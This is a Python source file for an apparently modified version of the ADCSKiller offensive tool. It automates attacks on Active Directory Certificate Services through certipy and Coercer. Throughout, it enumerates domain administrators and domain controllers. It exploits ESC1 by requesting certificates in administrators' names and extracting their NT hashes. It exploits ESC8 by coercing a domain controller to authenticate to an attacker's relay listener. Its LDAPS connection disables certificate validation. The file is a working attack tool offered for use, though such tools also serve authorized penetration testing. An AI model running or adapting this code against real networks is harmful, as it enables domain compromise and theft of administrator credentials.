#!/usr/bin/python3

""" ADCS exploitation automation

This tool tries to automate the process of exploiting ADCS by weaponizing certipy. 
Improved version with LDAPS support and better error handling.

References:
https://github.com/ly4k/Certipy
https://github.com/p0dalirius/Coercer

MIT License

Copyright (c) 2023 grimlockx

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

__author__ = "grimlockx"
__license__ = "MIT"
__version__ = "0.4"

import argparse
import subprocess
import re
import ldap3
import json
import threading
import time
import logging
import ssl
from datetime import datetime
from pathlib import Path


class Logger:
    """Enhanced logging functionality"""
    
    def __init__(self, output_dir=".", verbose=False):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        
        # Setup logging
        log_format = '%(asctime)s - %(levelname)s - %(message)s'
        logging.basicConfig(
            level=logging.DEBUG if verbose else logging.INFO,
            format=log_format,
            handlers=[
                logging.FileHandler(self.output_dir / 'adcskiller.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def info(self, message):
        self.logger.info(message)
        
    def error(self, message):
        self.logger.error(message)
        
    def debug(self, message):
        self.logger.debug(message)
        
    def warning(self, message):
        self.logger.warning(message)


class AuthenticationManager:
    """Handle various authentication methods"""
    
    def __init__(self, domain, username, password=None, ntlm_hash=None, 
                 kerberos_ticket=None, aes_key=None, use_kerberos=False):
        self.domain = domain
        self.username = username
        self.password = password
        self.ntlm_hash = ntlm_hash
        self.kerberos_ticket = kerberos_ticket
        self.aes_key = aes_key
        self.use_kerberos = use_kerberos
        
    def get_certipy_auth_args(self):
        """Get authentication arguments for certipy"""
        if self.kerberos_ticket:
            return f"-u '{self.username}'@{self.domain} -k -no-pass"
        elif self.aes_key:
            return f"-u '{self.username}'@{self.domain} -aes {self.aes_key}"
        elif self.ntlm_hash:
            return f"-u '{self.username}'@{self.domain} -hashes {self.ntlm_hash}"
        elif self.password:
            auth_args = f"-u '{self.username}'@{self.domain} -p '{self.password}'"
            if self.use_kerberos:
                auth_args += " -k"
            return auth_args
        else:
            raise ValueError("No authentication method provided")
    
    def get_coercer_auth_args(self):
        """Get authentication arguments for coercer"""
        if self.ntlm_hash:
            return f"-d {self.domain} -u '{self.username}' --hashes {self.ntlm_hash}"
        elif self.password:
            return f"-d {self.domain} -u '{self.username}' -p '{self.password}'"
        else:
            raise ValueError("Coercer requires password or NTLM hash")


class LDAPConnection:
    """Enhanced LDAP connection with LDAPS support"""
    
    def __init__(self, target, domain, username, password=None, ntlm_hash=None,
                 use_ldaps=False, ldap_channel_binding=False, port=None):
        self.target = target
        self.domain = domain
        self.domain_parts = domain.split(".")
        self.domain_cn = ','.join([f'dc={part}' for part in self.domain_parts])
        self.username = username
        self.password = password
        self.ntlm_hash = ntlm_hash
        self.use_ldaps = use_ldaps
        self.ldap_channel_binding = ldap_channel_binding
        
        # Determine port
        if port:
            self.port = port
        else:
            self.port = 636 if use_ldaps else 389
            
        self.connection = None
        
    def connect(self):
        """Establish LDAP/LDAPS connection"""
        protocol = 'ldaps' if self.use_ldaps else 'ldap'
        server_uri = f"{protocol}://{self.target}:{self.port}"
        
        # Setup TLS configuration for LDAPS
        tls_config = None
        if self.use_ldaps:
            tls_config = ldap3.Tls(
                validate=ssl.CERT_NONE,
                version=ssl.PROTOCOL_TLS,
                channel_binding=ldap3.CHANNEL_BINDING_TYPE.TLS_CHANNEL_BINDING if self.ldap_channel_binding else None
            )
        
        server = ldap3.Server(
            server_uri,
            get_info=ldap3.ALL,
            tls=tls_config
        )
        
        # Determine authentication method
        if self.ntlm_hash:
            # Use NTLM authentication with hash
            user_dn = f"{self.domain_parts[0]}\\{self.username}"
            authentication = ldap3.NTLM
            password = self.ntlm_hash
        else:
            # Use simple bind with password
            user_dn = f"{self.domain_parts[0]}\\{self.username}"
            authentication = ldap3.NTLM
            password = self.password
        
        try:
            self.connection = ldap3.Connection(
                server,
                user=user_dn,
                password=password,
                authentication=authentication,
                auto_bind=True
            )
            return True
        except Exception as e:
            logging.error(f"LDAP connection failed: {e}")
            return False
    
    def search(self, search_base, search_filter, attributes=None):
        """Perform LDAP search"""
        if not self.connection:
            raise Exception("LDAP connection not established")
            
        try:
            self.connection.search(
                search_base=search_base,
                search_filter=search_filter,
                attributes=attributes or ldap3.ALL_ATTRIBUTES
            )
            return self.connection.response
        except Exception as e:
            logging.error(f"LDAP search failed: {e}")
            return []
    
    def close(self):
        """Close LDAP connection"""
        if self.connection:
            self.connection.unbind()


class CertipyRelay(threading.Thread):
    """Certipy relay thread"""
    
    def __init__(self, thread_id, name, ca, template="DomainController"):
        threading.Thread.__init__(self)
        self.thread_id = thread_id
        self.name = name
        self.target_ca = ca
        self.template = template
        
    def run(self):
        logging.info(f'Started Relaying to {self.target_ca}')
        try:
            cmd = ["certipy", "relay", "-ca", self.target_ca, "-template", self.template]
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True
            )
            
            for line in process.stdout:
                print(line.strip())
                
        except Exception as e:
            logging.error(f"Certipy relay failed: {e}")


class Coercer(threading.Thread):
    """Coercer thread for authentication coercion"""
    
    def __init__(self, thread_id, name, auth_manager, target_dc, lhost):
        threading.Thread.__init__(self)
        self.thread_id = thread_id
        self.name = name
        self.auth_manager = auth_manager
        self.target_dc = target_dc
        self.lhost = lhost
        
    def run(self):
        logging.info(f'Started coercion from {self.target_dc} to {self.lhost}')
        try:
            auth_args = self.auth_manager.get_coercer_auth_args()
            cmd = f"Coercer coerce {auth_args} -t {self.target_dc} -l {self.lhost} --always-continue"
            
            result = subprocess.run(
                cmd.split(),
                capture_output=True,
                text=True,
                timeout=300  # 5 minute timeout
            )
            
            if result.returncode == 0:
                logging.info(f'Finished coercion from {self.target_dc} to {self.lhost}')
            else:
                logging.error(f'Coercion failed: {result.stderr}')
                
        except subprocess.TimeoutExpired:
            logging.error("Coercion timed out")
        except Exception as e:
            logging.error(f"Coercion failed: {e}")


class ADCSExploit:
    """Main ADCS exploitation class"""
    
    def __init__(self, domain, username, password=None, ntlm_hash=None, 
                 target=None, lhost=None, use_ldaps=False, ldap_channel_binding=False,
                 output_dir=".", verbose=False, dns_tcp=False, timeout=100):
        
        self.domain = domain
        self.domain_parts = domain.split(".")
        self.domain_cn = ','.join([f'dc={part}' for part in self.domain_parts])
        self.username = username
        self.password = password
        self.ntlm_hash = ntlm_hash
        self.target = target
        self.lhost = lhost
        self.use_ldaps = use_ldaps
        self.ldap_channel_binding = ldap_channel_binding
        self.dns_tcp = dns_tcp
        self.timeout = timeout
        
        # Initialize components
        self.logger = Logger(output_dir, verbose)
        self.auth_manager = AuthenticationManager(domain, username, password, ntlm_hash)
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        
        # Initialize data structures
        self.domain_admins = []
        self.vulnerable_certificate_templates = {}
        self.vulnerabilities = []
        self.domain_controllers = []
        self.certipy_output_prefix = None
        self.ca = None
        self.ca_dns = None
        
    def get_certipy_results(self):
        """Run certipy to find vulnerable certificate templates"""
        current_datetime = datetime.now()
        self.certipy_output_prefix = current_datetime.strftime("%Y%m%d%H%M%S")
        
        self.logger.info("Trying to find vulnerable certificate templates")
        
        # Build certipy command
        auth_args = self.auth_manager.get_certipy_auth_args()
        ldaps_param = "" if not self.use_ldaps else "-ldap-scheme ldaps"
        if self.ldap_channel_binding and self.use_ldaps:
            ldaps_param += " -ldap-channel-binding"
        
        dns_param = "-dns-tcp" if self.dns_tcp else ""
        
        cmd = [
            "certipy", "find",
            *auth_args.split(),
            "-dc-ip", self.target,
            "-vulnerable", "-json",
            "-output", self.certipy_output_prefix,
            "-timeout", str(self.timeout)
        ]
        
        if ldaps_param:
            cmd.extend(ldaps_param.split())
        if dns_param:
            cmd.append(dns_param)
        
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                cwd=self.output_dir,
                timeout=self.timeout + 30
            )
            
            if "Invalid credentials" in result.stdout:
                self.logger.error("Invalid credentials")
                return False
            elif "timed out" in result.stdout:
                self.logger.error("Connection timed out")
                return False
            elif result.returncode == 0:
                self.logger.info(f"Saved certipy output to {self.certipy_output_prefix}_Certipy.json")
                return True
            else:
                self.logger.error(f"Certipy command failed: {result.stderr}")
                return False
                
        except subprocess.TimeoutExpired:
            self.logger.error("Certipy command timed out")
            return False
        except Exception as e:
            self.logger.error(f"Certipy command execution failed: {e}")
            return False
    
    def bind_to_ldap(self):
        """Establish LDAP connection"""
        self.logger.info("Attempting LDAP connection")
        
        ldap_conn = LDAPConnection(
            self.target, self.domain, self.username,
            self.password, self.ntlm_hash, self.use_ldaps,
            self.ldap_channel_binding
        )
        
        if ldap_conn.connect():
            self.ldap_connection = ldap_conn
            protocol = "LDAPS" if self.use_ldaps else "LDAP"
            self.logger.info(f"{protocol} connection successful")
            return True
        else:
            self.logger.error("LDAP connection failed")
            return False
    
    def get_domain_admins(self):
        """Enumerate domain administrators"""
        if not hasattr(self, 'ldap_connection'):
            self.logger.error("LDAP connection required")
            return
        
        try:
            # Get domain SID
            self.logger.info("Getting Domain SID")
            response = self.ldap_connection.search(
                self.domain_cn,
                '(objectClass=domain)',
                ['objectSID']
            )
            
            if response:
                domain_sid = response[0]['attributes']['objectSid']
                self.logger.info(f"Received Domain SID: {domain_sid}")
            else:
                self.logger.error("Could not retrieve domain SID")
                return
            
            # Get Domain Admins group
            admin_group_filter = f'(&(objectCategory=group)(objectSid={domain_sid}-512))'
            response = self.ldap_connection.search(
                self.domain_cn,
                admin_group_filter,
                ['sAMAccountName']
            )
            
            if response:
                domain_admins_cn = response[0]['attributes']['sAMAccountName']
                self.logger.info(f"Domain Admins group: {domain_admins_cn}")
            else:
                self.logger.warning("Could not find Domain Admins group")
                return
            
            # Get members of Domain Admins
            admin_members_filter = f'(&(objectCategory=group)(cn={domain_admins_cn}))'
            response = self.ldap_connection.search(
                self.domain_cn,
                admin_members_filter,
                ['member']
            )
            
            if response and 'member' in response[0]['attributes']:
                for member_dn in response[0]['attributes']['member']:
                    # Extract CN from DN
                    cn_match = re.search(r'CN=([^,]+)', member_dn)
                    if cn_match:
                        self.domain_admins.append(cn_match.group(1))
                
                self.logger.info(f"Found Domain Administrators: {', '.join(self.domain_admins)}")
            else:
                self.logger.warning("Could not enumerate Domain Administrators")
                
        except Exception as e:
            self.logger.error(f"Error enumerating domain admins: {e}")
    
    def fetch_certipy_results(self):
        """Parse certipy JSON output"""
        json_file = self.output_dir / f"{self.certipy_output_prefix}_Certipy.json"
        
        if not json_file.exists():
            self.logger.error(f"Certipy JSON file not found: {json_file}")
            return {}
        
        try:
            with open(json_file, 'r') as f:
                certipy_json = json.load(f)
            
            # Extract CA information
            if "Certificate Authorities" in certipy_json and "0" in certipy_json["Certificate Authorities"]:
                ca_info = certipy_json["Certificate Authorities"]["0"]
                self.ca = ca_info.get("CA Name")
                self.ca_dns = ca_info.get("DNS Name")
                
                # Extract vulnerabilities
                vulnerabilities = ca_info.get("[!] Vulnerabilities", {})
                self.vulnerabilities = [key for key, value in vulnerabilities.items() if value]
                
                if self.vulnerabilities:
                    self.logger.info(f"Found vulnerabilities: {self.vulnerabilities}")
            
            # Extract vulnerable templates
            if "Certificate Templates" in certipy_json:
                for template in certipy_json["Certificate Templates"].values():
                    if "[!] Vulnerabilities" in template:
                        template_vulns = template["[!] Vulnerabilities"]
                        template_name = template.get("Template Name")
                        
                        for i in range(1, 12):  # ESC1-ESC11
                            esc_name = f'ESC{i}'
                            if esc_name in template_vulns and template_vulns[esc_name]:
                                if esc_name not in self.vulnerable_certificate_templates:
                                    self.vulnerable_certificate_templates[esc_name] = []
                                self.vulnerable_certificate_templates[esc_name].append(template_name)
                
                if self.vulnerable_certificate_templates:
                    self.logger.info("Found vulnerable certificate templates:")
                    for esc, templates in self.vulnerable_certificate_templates.items():
                        self.logger.info(f"{esc}: {', '.join(templates)}")
            
            return self.vulnerable_certificate_templates
            
        except Exception as e:
            self.logger.error(f"Error parsing certipy results: {e}")
            return {}
    
    def get_domain_controllers(self):
        """Enumerate domain controllers"""
        if not hasattr(self, 'ldap_connection'):
            self.logger.error("LDAP connection required")
            return
        
        try:
            self.logger.info("Getting Domain Controllers")
            dc_filter = '(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))'
            response = self.ldap_connection.search(
                self.domain_cn,
                dc_filter,
                ['distinguishedName', 'dNSHostName']
            )
            
            for entry in response:
                if 'dNSHostName' in entry['attributes']:
                    dns_name = entry['attributes']['dNSHostName']
                    if dns_name:
                        self.domain_controllers.append(dns_name)
                elif 'distinguishedName' in entry['attributes']:
                    # Extract hostname from DN as fallback
                    dn = entry['attributes']['distinguishedName']
                    cn_match = re.search(r'CN=([^,]+)', dn)
                    if cn_match:
                        hostname = f"{cn_match.group(1)}.{self.domain}"
                        self.domain_controllers.append(hostname)
            
            if self.domain_controllers:
                self.logger.info(f"Found domain controllers: {', '.join(self.domain_controllers)}")
            else:
                self.logger.warning("No domain controllers found")
                
        except Exception as e:
            self.logger.error(f"Error enumerating domain controllers: {e}")
    
    def exploit_esc1(self):
        """Exploit ESC1 vulnerability"""
        if "ESC1" not in self.vulnerable_certificate_templates:
            return
        
        self.logger.info("Exploiting ESC1 vulnerability")
        
        for admin in self.domain_admins:
            for template in self.vulnerable_certificate_templates["ESC1"]:
                self.logger.info(f"Requesting certificate for {admin} using template {template}")
                
                auth_args = self.auth_manager.get_certipy_auth_args()
                ldaps_param = "" if not self.use_ldaps else "-ldap-scheme ldaps"
                if self.ldap_channel_binding and self.use_ldaps:
                    ldaps_param += " -ldap-channel-binding"
                
                cmd = [
                    "certipy", "req",
                    *auth_args.split(),
                    "-target", self.target,
                    "-ca", self.ca,
                    "-template", template,
                    "-upn", admin,
                    "-out", f"{template}_{admin}",
                    "-key-size", "4096"
                ]
                
                if ldaps_param:
                    cmd.extend(ldaps_param.split())
                
                try:
                    result = subprocess.run(
                        cmd,
                        capture_output=True,
                        text=True,
                        cwd=self.output_dir,
                        timeout=120
                    )
                    
                    if "Got certificate" in result.stdout:
                        self.logger.info(f"Got certificate for {admin} using template {template}")
                        
                        # Try to authenticate with the certificate
                        cert_file = self.output_dir / f"{template}_{admin}.pfx"
                        if cert_file.exists():
                            auth_cmd = [
                                "certipy", "auth",
                                "-pfx", str(cert_file),
                                "-domain", self.domain,
                                "-username", admin,
                                "-dc-ip", self.target
                            ]
                            
                            auth_result = subprocess.run(
                                auth_cmd,
                                capture_output=True,
                                text=True,
                                timeout=60
                            )
                            
                            if "Got hash for" in auth_result.stdout:
                                hash_match = re.search(r"Got hash for '.*': (\w+:\w+)", auth_result.stdout)
                                if hash_match:
                                    nt_hash = hash_match.group(1)
                                    self.logger.info(f"Received NT hash for {admin}: {nt_hash}")
                    else:
                        self.logger.warning(f"Failed to get certificate for {admin}: {result.stdout}")
                        
                except subprocess.TimeoutExpired:
                    self.logger.error(f"Certificate request timed out for {admin}")
                except Exception as e:
                    self.logger.error(f"Certificate request failed for {admin}: {e}")
    
    def exploit_esc8(self):
        """Exploit ESC8 vulnerability"""
        if "ESC8" not in self.vulnerabilities:
            return
        
        self.logger.info("Exploiting ESC8 vulnerability")
        
        if not self.ca_dns or not self.domain_controllers:
            self.logger.error("Missing required information for ESC8 exploitation")
            return
        
        # Determine target DC for coercion
        target_dc = None
        if self.ca_dns not in self.domain_controllers:
            # CA is not a DC, use first available DC
            target_dc = self.domain_controllers[0] if self.domain_controllers else self.target
            self.logger.info(f"Certificate authority {self.ca_dns} is not a domain controller")
        elif len(self.domain_controllers) >= 2:
            # CA is a DC, use different DC for coercion
            for dc in self.domain_controllers:
                if dc != self.ca_dns:
                    target_dc = dc
                    break
            self.logger.info(f"Certificate authority is a domain controller")
        else:
            self.logger.warning("Cannot perform ESC8 - insufficient domain controllers")
            return
        
        if not target_dc:
            self.logger.error("No suitable target DC found for ESC8")
            return
        
        # Start certipy relay
        certipy_thread = CertipyRelay(1, "CertipyRelayThread", self.ca_dns)
        certipy_thread.daemon = True
        certipy_thread.start()
        
        # Wait for relay to initialize
        self.logger.info("Waiting 5 seconds for Certipy relay setup")
        time.sleep(5)
        
        # Start coercion
        coercer_thread = Coercer(2, "CoercerThread", self.auth_manager, target_dc, self.lhost)
        coercer_thread.daemon = True
        coercer_thread.start()
        
        # Wait for coercion to complete
        coercer_thread.join(timeout=300)  # 5 minute timeout
        
        if coercer_thread.is_alive():
            self.logger.warning("Coercion thread still running after timeout")
    
    def run_exploits(self):
        """Run appropriate exploits based on discovered vulnerabilities"""
        self.logger.info("Starting exploit execution")
        
        # Certificate template exploits
        certificate_exploits = {
            "ESC1": self.exploit_esc1,
            # Add more ESC exploits here as needed
        }
        
        # Environment/CA exploits
        environment_exploits = {
            "ESC8": self.exploit_esc8,
            # Add more environment exploits here
        }
        
        # Run template-based exploits
        for vuln in self.vulnerable_certificate_templates:
            if vuln in certificate_exploits:
                try:
                    certificate_exploits[vuln]()
                except Exception as e:
                    self.logger.error(f"Error exploiting {vuln}: {e}")
        
        # Run environment-based exploits
        for vuln in self.vulnerabilities:
            if vuln in environment_exploits:
                try:
                    environment_exploits[vuln]()
                except Exception as e:
                    self.logger.error(f"Error exploiting {vuln}: {e}")
    
    def cleanup(self):
        """Cleanup resources"""
        if hasattr(self, 'ldap_connection'):
            self.ldap_connection.close()


def main():
    banner = """
    
        ▄▄▄      ▓█████▄  ▄████▄    ██████  ██ ▄█▀ ██▓ ██▓     ██▓    ▓█████  ██▀███     
        ▒████▄    ▒██▀ ██▌▒██▀ ▀█  ▒██    ▒  ██▄█▒ ▓██▒▓██▒    ▓██▒    ▓█   ▀ ▓██ ▒ ██▒   
        ▒██  ▀█▄  ░██   █▌▒▓█    ▄ ░ ▓██▄   ▓███▄░ ▒██▒▒██░    ▒██░    ▒███   ▓██ ░▄█ ▒   
        ░██▄▄▄▄██ ░▓█▄   ▌▒▓▓▄ ▄██▒  ▒   ██▒▓██ █▄ ░██░▒██░    ▒██░    ▒▓█  ▄ ▒██▀▀█▄     
        ▓█   ▓██▒░▒████▓ ▒ ▓███▀ ░▒██████▒▒▒██▒ █▄░██░░██████▒░██████▒░▒████▒░██▓ ▒██▒   
        ▒▒   ▓▒█░ ▒▒▓  ▒ ░ ░▒ ▒  ░▒ ▒▓▒ ▒ ░▒ ▒▒ ▓▒░▓  ░ ▒░▓  ░░ ▒░▓  ░░░ ▒░ ░░ ▒▓ ░▒▓░   
        ▒   ▒▒ ░ ░ ▒  ▒   ░  ▒   ░ ░▒  ░ ░░ ░▒ ▒░ ▒ ░░ ░ ▒  ░░ ░ ▒  ░ ░ ░  ░  ░▒ ░ ▒░   
        ░   ▒    ░ ░  ░ ░        ░  ░  ░  ░ ░░ ░  ▒ ░  ░ ░     ░ ░      ░     ░░   ░    
            ░  ░   ░    ░ ░            ░  ░  ░    ░      ░  ░    ░  ░   ░  ░   ░        
                ░      ░                                                               

        """
    
    print(banner)
    print("ADCSKiller v0.4 - Enhanced ADCS Exploitation Tool")
    print("by Maurice Fielenbach (grimlockx) - Improved with LDAPS support")
    print()
    
    parser = argparse.ArgumentParser(
        description="ADCS exploitation automation with enhanced LDAPS support"
    )
    
    # Required arguments
    parser.add_argument('-d', '--domain', required=True, 
                       help='Target domain name (FQDN)')
    parser.add_argument('-u', '--username', required=True,
                       help='Username for authentication')
    parser.add_argument('-dc-ip', '--target', required=True,
                       help='IP address of the domain controller')
    parser.add_argument('-L', '--lhost', required=True,
                       help='FQDN of the listener machine')
    
    # Authentication options
    auth_group = parser.add_mutually_exclusive_group(required=True)
    auth_group.add_argument('-p', '--password',
                           help='Password for authentication')
    auth_group.add_argument('-H', '--hash',
                           help='NTLM hash for authentication (LM:NT format)')
    auth_group.add_argument('-K', '--kerberos-ticket',
                           help='Path to Kerberos ticket file')
    auth_group.add_argument('-A', '--aes-key',
                           help='AES key for Kerberos authentication')
    
    # LDAP options
    parser.add_argument('--ldaps', action='store_true',
                       help='Use LDAPS instead of LDAP (port 636)')
    parser.add_argument('--ldap-channel-binding', action='store_true',
                       help='Use LDAP channel binding (requires LDAPS)')
    parser.add_argument('--ldap-port', type=int,
                       help='Custom LDAP port (default: 389 for LDAP, 636 for LDAPS)')
    
    # Additional options
    parser.add_argument('-o', '--output', default='.',
                       help='Output directory (default: current directory)')
    parser.add_argument('--timeout', type=int, default=100,
                       help='Timeout for LDAP operations (default: 100)')
    parser.add_argument('--dns-tcp', action='store_true',
                       help='Use TCP for DNS queries')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Enable verbose output')
    parser.add_argument('--use-kerberos', action='store_true',
                       help='Force Kerberos authentication when using password')
    
    args = parser.parse_args()
    
    # Validate arguments
    if args.ldap_channel_binding and not args.ldaps:
        parser.error("--ldap-channel-binding requires --ldaps")
    
    # Determine authentication method
    password = args.password
    ntlm_hash = args.hash
    kerberos_ticket = args.kerberos_ticket
    aes_key = args.aes_key
    
    # Format NTLM hash if provided
    if ntlm_hash:
        if ':' not in ntlm_hash:
            ntlm_hash = f"aad3b435b51404eeaad3b435b51404ee:{ntlm_hash}"
        elif ntlm_hash.startswith(':'):
            ntlm_hash = f"aad3b435b51404eeaad3b435b51404ee{ntlm_hash}"
    
    try:
        # Initialize exploit class
        exploit = ADCSExploit(
            domain=args.domain,
            username=args.username,
            password=password,
            ntlm_hash=ntlm_hash,
            target=args.target,
            lhost=args.lhost,
            use_ldaps=args.ldaps,
            ldap_channel_binding=args.ldap_channel_binding,
            output_dir=args.output,
            verbose=args.verbose,
            dns_tcp=args.dns_tcp,
            timeout=args.timeout
        )
        
        # Set Kerberos ticket if provided
        if kerberos_ticket:
            exploit.auth_manager.kerberos_ticket = kerberos_ticket
        if aes_key:
            exploit.auth_manager.aes_key = aes_key
        if args.use_kerberos:
            exploit.auth_manager.use_kerberos = True
        
        # Run exploitation workflow
        if exploit.get_certipy_results():
            if exploit.bind_to_ldap():
                exploit.get_domain_admins()
                exploit.get_domain_controllers()
                exploit.fetch_certipy_results()
                exploit.run_exploits()
            else:
                logging.error("Failed to establish LDAP connection")
        else:
            logging.error("Failed to get certipy results")
            
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
    except Exception as e:
        logging.error(f"Unexpected error: {e}")
    finally:
        if 'exploit' in locals():
            exploit.cleanup()


if __name__ == "__main__":
    main()
